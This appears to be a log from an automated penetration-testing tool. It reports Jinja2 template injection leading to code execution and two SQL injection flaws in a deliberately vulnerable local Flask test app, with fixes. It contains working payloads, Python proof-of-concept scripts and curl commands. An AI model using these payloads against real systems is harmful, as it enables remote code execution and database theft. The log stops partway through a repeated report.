@@ -1,0 +1,1085 @@
+
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test initiated                                                  │
+│                                                                              │
+│  Target  /tmp/test-vuln-hard                                                 │
+│  Output  strix_runs/test-vuln-hard_424b                                      │
+│                                                                              │
+│  Vulnerabilities will be displayed in real-time.                             │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Unauthenticated Jinja2 Server-Side Template Injection to Remote      │
+│  Code Execution in POST /render (tpl)                                        │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.8                                                             │
+│                                                                              │
+│  Target: /workspace/test-vuln-hard                                           │
+│                                                                              │
+│  Endpoint: /render                                                           │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
+│                                                                              │
+│  Description                                                                 │
+│  The `tpl` form field of `POST /render` is passed directly to Flask's        │
+│  `render_template_string`, so the value is compiled by the active Jinja2     │
+│  environment as template source rather than rendered as data. An             │
+│  unauthenticated attacker can therefore evaluate arbitrary Jinja2            │
+│  expressions and escalate through reachable Python objects to execute        │
+│  operating-system commands on the server. The module docstring describes     │
+│  the sink as "Mako SSTI", but the imported function compiles Jinja2, which   │
+│  is what actually executes.                                                  │
+│                                                                              │
+│  Impact                                                                      │
+│  Remote, unauthenticated code execution in the security context of the       │
+│  application process. Demonstrated consequences: disclosure of the full      │
+│  Flask configuration object, execution of arbitrary shell commands with      │
+│  output returned in the HTTP response (`id`, `uname -a`, arbitrary file      │
+│  reads), which allows reading application secrets and database contents,     │
+│  writing files, and pivoting to anything reachable from the host. Command    │
+│  execution ran as the unprivileged service account, which limits immediate   │
+│  privilege but yields complete application compromise.                       │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The handler at `app.py:39-43` takes the raw request value and hands it to   │
+│  `render_template_string` as the template body:                              │
+│                                                                              │
+│  ```python title=app.py startLineNumber=39 endLineNumber=43                  │
+│  @app.route("/render", methods=["POST"])                                     │
+│  def render():                                                               │
+│      # (3) SSTI via a POST form field (not a query string)                   │
+│      tpl = request.form.get("tpl", "hello")                                  │
+│      return render_template_string(tpl)                                      │
+│  ```                                                                         │
+│                                                                              │
+│  `flask.render_template_string(source, **context)` is a thin wrapper over    │
+│  `app.jinja_env.from_string(source).render(context)`. The first positional   │
+│  argument is the *template source*, so `request.form["tpl"]` is parsed by    │
+│  the Jinja2 compiler and any `{{ ... }}`, `{% ... %}` or `{# ... #}`         │
+│  constructs inside it are evaluated server-side. There is no sandbox         │
+│  (`jinja2.sandbox.SandboxedEnvironment` is not used), no allowlist, and no   │
+│  separation between template and data.                                       │
+│                                                                              │
+│  The docstring at `app.py:6` ("Mako SSTI in a POST form field (not Jinja2,   │
+│  not a query string)") is inaccurate: `render_template_string` imports from  │
+│  `flask` (`app.py:9`) and always uses the application's Jinja2 environment.  │
+│  Runtime fingerprinting agrees — `{{7*'7'}}` evaluates to `7777777` (Jinja   │
+│  string repetition; Twig would return `49`), and                             │
+│  `{{self.__class__.__mro__}}` leaks `<class                                  │
+│  'jinja2.runtime.TemplateReference'>`. Mako-style `${7*7}` and ERB-style     │
+│  `<%= 7*7 %>` are returned literally unrendered. This matters for            │
+│  remediation: hardening guidance aimed at Mako does not apply, and the fix   │
+│  must address Jinja2 specifically.                                           │
+│                                                                              │
+│  Escalation follows the standard Jinja2 path. The default environment        │
+│  exposes the `cycler`, `lipsum`, `joiner`, `namespace` and `config`          │
+│  globals. `cycler` is a function, so `cycler.__init__.__globals__` exposes   │
+│  the defining module's globals — including the `os` module imported by       │
+│  `jinja2.utils`. From there `os.popen(...).read()` returns command output    │
+│  directly into the response body. Equivalent chains exist through            │
+│  `config.__class__.__init__.__globals__` and through                         │
+│  `"".__class__.__mro__[1].__subclasses__()[167]`                             │
+│  (`_wrap_close.__init__.__globals__`). No deny-lists, attribute filters, or  │
+│  sandbox restrictions are present to break any of these chains.              │
+│                                                                              │
+│  Because the whole application is unauthenticated and the route has no       │
+│  CSRF/authorization layer, the vulnerability is reachable by any client      │
+│  that can reach the port. Exploitation requires no user interaction and no   │
+│  prior privileges.                                                           │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Start the application (a private copy of `app.py` was used with its own  │
+│  seeded database, bound to a test port, so the original directory was not    │
+│  modified).                                                                  │
+│  2. Send a benign baseline request to prove the field is normally reflected  │
+│  as data: POST `tpl=hello`. The response body is `hello`.                    │
+│  3. Send a template expression as the same field: POST `tpl={{7*7}}`. The    │
+│  response body is `49`.                                                      │
+│  4. Send a second, different expression to rule out coincidence or           │
+│  hard-coded reflection: POST `tpl={{7*8}}`. The response body is `56`.       │
+│  5. Fingerprint the engine: POST `tpl={{7*'7'}}` returns `7777777` and POST  │
+│  `tpl={{self.__class__.__mro__}}` returns `<class                            │
+│  'jinja2.runtime.TemplateReference'>`, identifying Jinja2. Mako `${7*7}`     │
+│  and ERB `<%= 7*7 %>` are returned literally.                                │
+│  6. Confirm access to framework globals: POST `tpl={{config}}` returns the   │
+│  fully rendered Flask configuration object.                                  │
+│  7. Reach code execution: POST                                               │
+│  `tpl={{cycler.__init__.__globals__.os.popen("id").read()}}` returns         │
+│  `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.  │
+│  8. Confirm arbitrary command execution beyond identity: POST                │
+│  `tpl={{cycler.__init__.__globals__.os.popen("uname -a").read()}}` returns   │
+│  the host kernel banner, and POST                                            │
+│  `tpl={{cycler.__init__.__globals__.os.popen("cat                            │
+│  <path>/marker.txt").read()}}` returns the contents of a marker file         │
+│  created for the test.                                                       │
+│  9. Confirm the chain is not specific to one gadget by repeating with        │
+│  `{{config.__class__.__init__.__globals__["os"].popen("echo                  │
+│  hi_from_config_gadget; id").read()}}`,                                      │
+│  `{{"".__class__.__mro__[1].__subclasses__()[167].__init__.__globals__["__b  │
+│  uiltins__"]["__import__"]("os").popen("id").read()}}` and                   │
+│  `{{lipsum.__globals__["os"].popen("id").read()}}` — all returned command    │
+│  output.                                                                     │
+│                                                                              │
+│  PoC Code                                                                    │
+│  ```python                                                                   │
+│  import re                                                                   │
+│  import requests                                                             │
+│                                                                              │
+│  BASE = "http://127.0.0.1:8111/render"                                       │
+│                                                                              │
+│  # Payloads exactly as sent in the form body                                 │
+│  (application/x-www-form-urlencoded).                                        │
+│  PAYLOADS = {                                                                │
+│      "baseline": "hello",                                                    │
+│      "math_1": "{{7*7}}",                                                    │
+│      "math_2": "{{7*8}}",                                                    │
+│      "engine_fingerprint": "{{7*'7'}}",                                      │
+│      "mro_fingerprint": "{{self.__class__.__mro__}}",                        │
+│      "config_disclosure": "{{config}}",                                      │
+│      "rce_id": '{{cycler.__init__.__globals__.os.popen("id").read()}}',      │
+│      "rce_uname": '{{cycler.__init__.__globals__.os.popen("uname             │
+│  -a").read()}}',                                                             │
+│      "rce_marker": '{{cycler.__init__.__globals__.os.popen("cat              │
+│  /workspace/ssti-render-work/marker.txt").read()}}',                         │
+│      "rce_config_gadget":                                                    │
+│  '{{config.__class__.__init__.__globals__["os"].popen("echo                  │
+│  hi_from_config_gadget; id").read()}}',                                      │
+│      "rce_subclasses_gadget":                                                │
+│  '{{"".__class__.__mro__[1].__subclasses__()[167].__init__.__globals__["__b  │
+│  uiltins__"]["__import__"]("os").popen("id").read()}}',                      │
+│      "rce_lipsum_gadget":                                                    │
+│  '{{lipsum.__globals__["os"].popen("id").read()}}',                          │
+│      # Negative controls: these would fire on Mako / ERB, not Jinja2.        │
+│      "mako_probe": "${7*7}",                                                 │
+│      "erb_probe": "<%= 7*7 %>",                                              │
+│  }                                                                           │
+│                                                                              │
+│  for name, payload in PAYLOADS.items():                                      │
+│      r = requests.post(BASE, data={"tpl": payload}, timeout=15)              │
+│      body = r.text                                                           │
+│      if name == "config_disclosure":                                         │
+│          body = body[:160] + " ..."                                          │
+│      print(f"[{name}] status={r.status_code} payload={payload!r}")           │
+│      print(f"    response={body!r}")                                         │
+│                                                                              │
+│  # Machine check: command output must contain a uid= line.                   │
+│  r = requests.post(BASE, data={"tpl": PAYLOADS["rce_id"]}, timeout=15)       │
+│  assert re.search(r"uid=\d+", r.text), "command output not reflected"        │
+│  print("\nCONFIRMED: unauthenticated command execution with output in the    │
+│  HTTP response")                                                             │
+│  ```                                                                         │
+│                                                                              │
+│  Equivalent raw curl commands (identical, using automatic form encoding):    │
+│                                                                              │
+│  ```bash                                                                     │
+│  curl -s -X POST --data-urlencode 'tpl=hello'                                │
+│  http://127.0.0.1:8111/render                                                │
+│  curl -s -X POST --data-urlencode 'tpl={{7*7}}'                              │
+│  http://127.0.0.1:8111/render                                                │
+│  curl -s -X POST --data-urlencode 'tpl={{7*8}}'                              │
+│  http://127.0.0.1:8111/render                                                │
+│  curl -s -X POST --data-urlencode 'tpl={{config}}'                           │
+│  http://127.0.0.1:8111/render                                                │
+│  curl -s -X POST --data-urlencode                                            │
+│  'tpl={{cycler.__init__.__globals__.os.popen("id").read()}}'                 │
+│  http://127.0.0.1:8111/render                                                │
+│  ```                                                                         │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:39-43                                                  │
+│    Root cause: user input passed as the Jinja2 template source               │
+│    @app.route("/render", methods=["POST"])                                   │
+│  def render():                                                               │
+│      # (3) SSTI via a POST form field (not a query string)                   │
+│      tpl = request.form.get("tpl", "hello")                                  │
+│      return render_template_string(tpl)                                      │
+│    Fix:                                                                      │
+│    - @app.route("/render", methods=["POST"])                                 │
+│  def render():                                                               │
+│      # (3) SSTI via a POST form field (not a query string)                   │
+│      tpl = request.form.get("tpl", "hello")                                  │
+│      return render_template_string(tpl)                                      │
+│    + @app.route("/render", methods=["POST"])                                 │
+│  def render():                                                               │
+│      # (3) user input is data, never template source                         │
+│      name = request.form.get("tpl", "hello")                                 │
+│      return render_template_string("Hello {{ name }}", name=name)            │
+│                                                                              │
+│    Location 2: app.py:6                                                      │
+│    Supporting: docstring misidentifies the engine, which misdirects          │
+│  remediation                                                                 │
+│      3. Mako SSTI in a POST form field (not Jinja2, not a query string)      │
+│    Fix:                                                                      │
+│    -   3. Mako SSTI in a POST form field (not Jinja2, not a query string)    │
+│    +   3. Jinja2 SSTI in a POST form field (Flask render_template_string,    │
+│  not Mako)                                                                   │
+│                                                                              │
+│  Remediation                                                                 │
+│  Stop compiling user input as a template. The root cause is that the         │
+│  request value is passed as the *template source* argument of                │
+│  `render_template_string`. Make the template a fixed, developer-controlled   │
+│  constant (or a file under `templates/`) and pass the user-supplied value    │
+│  as a context variable so Jinja only ever renders it as data. The suggested  │
+│  code change implements this: a constant `"Hello {{ name }}"` template with  │
+│  `name=tpl` passed in the context, which preserves the intended "echo the    │
+│  submitted value" behaviour while eliminating evaluation.                    │
+│                                                                              │
+│  If the product genuinely requires caller-supplied templates (a user-facing  │
+│  template editor), then a fixed template is not an option and the            │
+│  alternative is a `jinja2.sandbox.SandboxedEnvironment` with                 │
+│  `autoescape=True`, an empty or explicit allowlist of globals/filters, and   │
+│  rendering of untrusted templates restricted to a non-privileged context.    │
+│  That route is materially harder to secure — Jinja sandbox advisories and    │
+│  sandbox-escape gadget chains recur — and should be treated as a last        │
+│  resort with independent security review, not as equivalent to the           │
+│  fixed-template fix.                                                         │
+│                                                                              │
+│  Additionally: correct the module docstring, which states the sink is Mako;  │
+│  the actual engine is Jinja2, and remediation guidance must match the real   │
+│  engine. As defence in depth, run the service as a dedicated unprivileged    │
+│  account with no access to the database file's directory beyond what it      │
+│  needs, and apply a request-size cap, since none of these measures address   │
+│  the root cause on their own.                                                │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in GET /orders sort parameter (ORDER BY clause)        │
+│                                                                              │
+│  Severity: HIGH                                                              │
+│                                                                              │
+│  CVSS Score: 7.5                                                             │
+│                                                                              │
+│  Target: /workspace/test-vuln-hard                                           │
+│                                                                              │
+│  Endpoint: /orders                                                           │
+│                                                                              │
+│  Method: GET                                                                 │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
+│  the SQL `ORDER BY` clause with an f-string instead of being restricted to   │
+│  a fixed set of column names. An unauthenticated attacker can inject         │
+│  arbitrary SQL expressions, including sub-selects, turning the endpoint      │
+│  into a blind SQL-injection oracle over the whole database. The hidden       │
+│  `note` column — never part of this route's projected columns — and the      │
+│  database schema were both extracted through it.                             │
+│                                                                              │
+│  Impact                                                                      │
+│  Unauthenticated arbitrary read of the backing SQLite database. The          │
+│  extraction PoC recovers the complete `note` column (including               │
+│  `flag{orderby_ok}`) and `sqlite_master` schema through an endpoint whose    │
+│  legitimate response only ever contains `id, sku, qty`. Any table readable   │
+│  by the application's database user can be extracted the same way, one bit   │
+│  per request.                                                                │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The `orders()` view builds its SQL by string formatting:                    │
+│                                                                              │
+│  ```python title=app.py startLineNumber=25 endLineNumber=27                  │
+│      sort = request.args.get("sort", "id")                                   │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│  ```                                                                         │
+│                                                                              │
+│  `request.args.get("sort", "id")` returns an arbitrary attacker-supplied     │
+│  string, and the f-string places it verbatim where SQLite expects a column   │
+│  reference or expression. Nothing constrains it to an identifier: no         │
+│  allowlist, no identifier quoting, no character filtering.                   │
+│                                                                              │
+│  Because `ORDER BY` accepts any expression in SQLite, the payload *is* the   │
+│  sort expression and does not need to break out of a string literal. Two     │
+│  techniques demonstrate arbitrary read.                                      │
+│                                                                              │
+│  **Schema and projection discovery.** `sort=4` returns `HTTP 500` with `1st  │
+│  ORDER BY term out of range - should be between 1 and 3`, confirming a       │
+│  three-column projection and giving an error-based channel. A `UNION         │
+│  SELECT` is not available at this position (SQLite raises `ORDER BY clause   │
+│  should come after UNION not before`), so the proven channel is              │
+│  expression-based.                                                           │
+│                                                                              │
+│  **Boolean blind extraction of the non-projected `note` column.** The        │
+│  payload `(CASE WHEN (<predicate>) THEN id ELSE -id END)` is a legal `ORDER  │
+│  BY` expression. When the predicate is TRUE the response is ordered          │
+│  ascending by `id` (`1,2,3`); when FALSE it is ordered by `-id` (`3,2,1`).   │
+│  This is a stable oracle visible in the JSON ordering, with no error         │
+│  channel and no timing. Binary-searching `unicode(substr(note,i,1))`         │
+│  recovers the whole column:                                                  │
+│                                                                              │
+│  ```                                                                         │
+│  orders.id=1 note = 'flag{orderby_ok}'                                       │
+│  orders.id=2 note = 'nothing'                                                │
+│  orders.id=3 note = 'x'                                                      │
+│  sqlite_version() = 3.53.4                                                   │
+│  ```                                                                         │
+│                                                                              │
+│  The same oracle applied to `sqlite_master` flips the ordering in the TRUE   │
+│  case and not in the FALSE case, confirming arbitrary schema access through  │
+│  the same insertion point. Malformed input additionally produces a werkzeug  │
+│  traceback exposing the source path; that is supporting evidence of the      │
+│  interpolation, not the finding itself.                                      │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Start the application from a private working copy on a non-conflicting   │
+│  port so the workspace directory is untouched.                               │
+│  2. Send the benign baseline `GET /orders?sort=id` and record the three-row  │
+│  response as the negative control.                                           │
+│  3. Send `GET /orders?sort=4`. Observe `HTTP 500` and `1st ORDER BY term     │
+│  out of range - should be between 1 and 3`, establishing the injection       │
+│  point and the three-column projection.                                      │
+│  4. Send the boolean-TRUE payload `GET /orders?sort=(CASE WHEN (SELECT       │
+│  substr(note,1,5) FROM orders WHERE id=1)="flag{" THEN id ELSE -id END)`.    │
+│  Observe rows ordered `1,2,3`.                                               │
+│  5. Send the boolean-FALSE control with an identical payload shape but a     │
+│  false predicate (`="zzzz!"`). Observe rows ordered `3,2,1`. The ordering    │
+│  difference between steps 4 and 5 is the extraction oracle.                  │
+│  6. Run the automated binary-search extractor to recover `note` for every    │
+│  row plus `sqlite_version()`; results include `flag{orderby_ok}`.            │
+│  7. Repeat the oracle against `sqlite_master` to confirm schema access from  │
+│  the same injection point.                                                   │
+│                                                                              │
+│  PoC Code                                                                    │
+│  ```python                                                                   │
+│  import requests                                                             │
+│                                                                              │
+│  BASE = "http://127.0.0.1:8107/orders"                                       │
+│                                                                              │
+│                                                                              │
+│  def ask(predicate):                                                         │
+│      """True -> rows sorted by id ascending (1,2,3); False -> by -id         │
+│  (3,2,1)."""                                                                 │
+│      payload = f"(CASE WHEN ({predicate}) THEN id ELSE -id END)"             │
+│      rows = requests.get(BASE, params={"sort": payload}, timeout=10).json()  │
+│      return [r[0] for r in rows] == [1, 2, 3]                                │
+│                                                                              │
+│                                                                              │
+│  def extract(expr, maxlen=64):                                               │
+│      out = ""                                                                │
+│      for i in range(1, maxlen + 1):                                          │
+│          lo, hi = 32, 126                                                    │
+│          while lo < hi:                                                      │
+│              mid = (lo + hi) // 2                                            │
+│              if ask(f"unicode(substr(({expr}),{i},1))>{mid}"):               │
+│                  lo = mid + 1                                                │
+│              else:                                                           │
+│                  hi = mid                                                    │
+│          if lo < 32:                                                         │
+│              break                                                           │
+│          out += chr(lo)                                                      │
+│          if not ask(f"length(({expr}))>={i + 1}"):                           │
+│              break                                                           │
+│      return out                                                              │
+│                                                                              │
+│                                                                              │
+│  assert ask("1=1") is True and ask("1=2") is False   # oracle sanity check   │
+│                                                                              │
+│  for rid in (1, 2, 3):                                                       │
+│      print(f"orders.id={rid} note = {extract(f'SELECT note FROM orders       │
+│  WHERE id={rid}')!r}")                                                       │
+│                                                                              │
+│  print("sqlite_version() =", extract("SELECT sqlite_version()", 20))         │
+│                                                                              │
+│  schema = ask('(SELECT count(*) FROM sqlite_master WHERE type="table" AND    │
+│  name="orders")=1')                                                          │
+│  print("sqlite_master reachable:", schema)                                   │
+│  ```                                                                         │
+│                                                                              │
+│  Equivalent single-shot requests:                                            │
+│                                                                              │
+│  ```                                                                         │
+│  GET /orders?sort=id                                                         │
+│  GET /orders?sort=4                                                          │
+│  GET                                                                         │
+│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
+│  %3D%22flag%7B%22+THEN+id+ELSE+-id+END)                                      │
+│  GET                                                                         │
+│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
+│  %3D%22zzzz%21%22+THEN+id+ELSE+-id+END)                                      │
+│  ```                                                                         │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:25-27                                                  │
+│    Reject non-allowlisted sort keys and order by the fixed SQL fragment      │
+│        sort = request.args.get("sort", "id")                                 │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│    Fix:                                                                      │
+│    -     sort = request.args.get("sort", "id")                               │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│    +     sort = request.args.get("sort", "id")                               │
+│      if sort not in SORT_COLUMNS:                                            │
+│          return jsonify({"error": "invalid sort column"}), 400               │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {SORT_COLUMNS[sort]}").fetchall()                                           │
+│                                                                              │
+│    Location 2: app.py:12                                                     │
+│    Add the sort-column allowlist constant                                    │
+│    DB = "/tmp/test-vuln-hard/orders.db"                                      │
+│    Fix:                                                                      │
+│    - DB = "/tmp/test-vuln-hard/orders.db"                                    │
+│    + DB = "/tmp/test-vuln-hard/orders.db"                                    │
+│                                                                              │
+│  SORT_COLUMNS = {"id": "id", "sku": "sku", "qty": "qty"}                     │
+│                                                                              │
+│  Remediation                                                                 │
+│  1. Never build SQL syntax from request data. `ORDER BY` cannot be           │
+│  parameterised on column names in SQLite, so map the user-supplied sort key  │
+│  through a fixed allowlist dictionary to hard-coded SQL fragments and        │
+│  reject anything not in the allowlist with a 400 before the query is built.  │
+│  2. Keep the allowlist as a module-level constant next to the schema so      │
+│  sortable columns are added deliberately rather than implicitly.             │
+│  3. Where a value rather than an identifier is needed in a query, always     │
+│  use `?` placeholders with tuple arguments, as in the companion fix for      │
+│  `POST /orders/by-sku`.                                                      │
+│  4. Add a regression test asserting that a non-allowlisted `sort` value      │
+│  returns 400 and never reaches the database, and that every documented sort  │
+│  key still returns correctly ordered rows.                                   │
+│  5. As defence in depth only, run the application with a least-privilege     │
+│  database account.                                                           │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in POST /orders/by-sku via JSON body sku field         │
+│                                                                              │
+│  Severity: HIGH                                                              │
+│                                                                              │
+│  CVSS Score: 7.5                                                             │
+│                                                                              │
+│  Target: /workspace/test-vuln-hard                                           │
+│                                                                              │
+│  Endpoint: /orders/by-sku                                                    │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The `sku` field of the JSON body accepted by `POST /orders/by-sku` is       │
+│  interpolated into a single-quoted SQL string literal with an f-string       │
+│  instead of being bound as a parameter. An unauthenticated attacker can      │
+│  break out of the literal, append a `UNION SELECT`, and read arbitrary rows  │
+│  and schema metadata. A single request returns every row of the `orders`     │
+│  table — including the `note` values of rows the caller never asked for —    │
+│  and the `sqlite_master` DDL.                                                │
+│                                                                              │
+│  Impact                                                                      │
+│  Unauthenticated arbitrary read of the backing SQLite database in a single   │
+│  request. The PoC returns all rows of `orders` (including the `note` column  │
+│  of rows other than the requested SKU) and the full `CREATE TABLE` DDL from  │
+│  `sqlite_master`, and reads `sqlite_version()`. The legitimate endpoint      │
+│  returns at most one row for one SKU. Any table readable by the              │
+│  application's database user is equally reachable.                           │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The `by_sku()` view builds its query by string formatting:                  │
+│                                                                              │
+│  ```python title=app.py startLineNumber=34 endLineNumber=36                  │
+│      sku = body.get("sku", "alpha")                                          │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
+│  '{sku}'").fetchall()                                                        │
+│  ```                                                                         │
+│                                                                              │
+│  The attacker-controlled JSON field `sku` is placed between single quotes    │
+│  inside a SQL string literal. No escaping, parameter binding, or type        │
+│  restriction is applied, so a value containing a single quote terminates     │
+│  the literal and everything after it is parsed as SQL.                       │
+│  `request.get_json(force=True, silent=True)` means the payload arrives as    │
+│  an ordinary JSON body, so filters that only inspect query strings are       │
+│  irrelevant.                                                                 │
+│                                                                              │
+│  Because the projection has three columns, supplying `zzz' UNION SELECT      │
+│  id,sku,note FROM orders --` closes the literal, discards the intended       │
+│  predicate, and unions the whole table, returning all three rows with their  │
+│  `note` values including `flag{orderby_ok}`. Substituting literals and       │
+│  sub-selects (`UNION SELECT 99,sqlite_version(),(SELECT group_concat(note)   │
+│  FROM orders) --`) extracts engine version and aggregated data, and `UNION   │
+│  SELECT 1,name,sql FROM sqlite_master --` returns the schema DDL. The        │
+│  trailing `--` comments out the remainder of the original statement.         │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Run the application from a private working copy on a non-conflicting     │
+│  port so the workspace directory is untouched.                               │
+│  2. Send the benign baseline `POST /orders/by-sku` with body `{"sku":        │
+│  "alpha"}`. Observe exactly one row returned, as intended.                   │
+│  3. Send the same request with body `{"sku": "zzz' UNION SELECT id,sku,note  │
+│  FROM orders --"}`. Observe all three rows returned with their `note`        │
+│  values, including `flag{orderby_ok}`.                                       │
+│  4. Send `{"sku": "zzz' UNION SELECT 99,sqlite_version(),(SELECT             │
+│  group_concat(note) FROM orders) --"}` to confirm arbitrary expressions and  │
+│  aggregation in the injected projection.                                     │
+│  5. Send `{"sku": "zzz' UNION SELECT 1,name,sql FROM sqlite_master --"}` to  │
+│  retrieve the schema DDL.                                                    │
+│  6. Compare step 2 against steps 3-5: the legitimate query was asked for     │
+│  one SKU, and the injected responses disclose the entire table and schema.   │
+│                                                                              │
+│  PoC Code                                                                    │
+│  ```python                                                                   │
+│  import requests                                                             │
+│                                                                              │
+│  URL = "http://127.0.0.1:8107/orders/by-sku"                                 │
+│                                                                              │
+│  # 1. Benign baseline: one row for the requested SKU                         │
+│  print("baseline alpha :", requests.post(URL, json={"sku":                   │
+│  "alpha"}).json())                                                           │
+│  print("baseline beta  :", requests.post(URL, json={"sku": "beta"}).json())  │
+│                                                                              │
+│  # 2. UNION -- dump every row with its note column                           │
+│  print("union dump     :", requests.post(                                    │
+│      URL, json={"sku": "zzz' UNION SELECT id,sku,note FROM orders            │
+│  --"}).json())                                                               │
+│                                                                              │
+│  # 3. Arbitrary expressions + aggregation in the injected projection         │
+│  print("version+notes  :", requests.post(                                    │
+│      URL, json={"sku": "zzz' UNION SELECT 99,sqlite_version(),(SELECT        │
+│  group_concat(note) FROM orders) --"}).json())                               │
+│                                                                              │
+│  # 4. Schema disclosure                                                      │
+│  print("schema DDL     :", requests.post(                                    │
+│      URL, json={"sku": "zzz' UNION SELECT 1,name,sql FROM sqlite_master      │
+│  --"}).json())                                                               │
+│  ```                                                                         │
+│                                                                              │
+│  Equivalent raw request for the primary payload:                             │
+│                                                                              │
+│  ```http                                                                     │
+│  POST /orders/by-sku HTTP/1.1                                                │
+│  Host: 127.0.0.1:8107                                                        │
+│  Content-Type: application/json                                              │
+│                                                                              │
+│  {"sku":"zzz' UNION SELECT id,sku,note FROM orders --"}                      │
+│  ```                                                                         │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:36                                                     │
+│    Bind sku as a query parameter instead of interpolating it                 │
+│        rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =    │
+│  '{sku}'").fetchall()                                                        │
+│    Fix:                                                                      │
+│    -     rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =  │
+│  '{sku}'").fetchall()                                                        │
+│    +     rows = conn.execute("SELECT id, sku, note FROM orders WHERE sku =   │
+│  ?", (sku,)).fetchall()                                                      │
+│                                                                              │
+│  Remediation                                                                 │
+│  1. Bind the value instead of interpolating it: pass `"SELECT id, sku, note  │
+│  FROM orders WHERE sku = ?"` to `conn.execute` with a one-element tuple      │
+│  argument, so the value is sent to SQLite as data and can never become       │
+│  syntax.                                                                     │
+│  2. Apply the same rule to every other query in the codebase; audit for      │
+│  f-strings, `%` formatting and `.format()` inside SQL strings.               │
+│  3. Validate the input shape as defence in depth: reject a non-string or     │
+│  over-long `sku` with a 400 rather than letting it reach the database.       │
+│  4. Add a regression test that posts a `sku` containing a single quote and   │
+│  a `UNION` and asserts that the response contains no rows beyond the         │
+│  requested SKU, and that a valid SKU still returns its single row.           │
+│  5. Consider running the service with a least-privilege database account so  │
+│  that even a future injection cannot read unrelated tables.                  │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 (updated) ────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in GET /orders sort parameter (ORDER BY clause)        │
+│                                                                              │
+│  Severity: HIGH                                                              │
+│                                                                              │
+│  CVSS Score: 7.5                                                             │
+│                                                                              │
+│  Target: /workspace/test-vuln-hard                                           │
+│                                                                              │
+│  Endpoint: /orders                                                           │
+│                                                                              │
+│  Method: GET                                                                 │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
+│  the SQL `ORDER BY` clause with an f-string instead of being restricted to   │
+│  a fixed set of column names. An unauthenticated attacker can inject         │
+│  arbitrary SQL expressions, including sub-selects, turning the endpoint      │
+│  into a blind SQL-injection oracle over the whole database. The hidden       │
+│  `note` column — never part of this route's projected columns — and the      │
+│  database schema were both extracted through it.                             │
+│                                                                              │
+│  Impact                                                                      │
+│  Unauthenticated arbitrary read of the backing SQLite database. The          │
+│  extraction PoC recovers the complete `note` column (including               │
+│  `flag{orderby_ok}`) and `sqlite_master` schema through an endpoint whose    │
+│  legitimate response only ever contains `id, sku, qty`. Any table readable   │
+│  by the application's database user can be extracted the same way, one bit   │
+│  per request.                                                                │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The `orders()` view builds its SQL by string formatting:                    │
+│                                                                              │
+│  ```python title=app.py startLineNumber=25 endLineNumber=27                  │
+│      sort = request.args.get("sort", "id")                                   │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│  ```                                                                         │
+│                                                                              │
+│  `request.args.get("sort", "id")` returns an arbitrary attacker-supplied     │
+│  string, and the f-string places it verbatim where SQLite expects a column   │
+│  reference or expression. Nothing constrains it to an identifier: no         │
+│  allowlist, no identifier quoting, no character filtering.                   │
+│                                                                              │
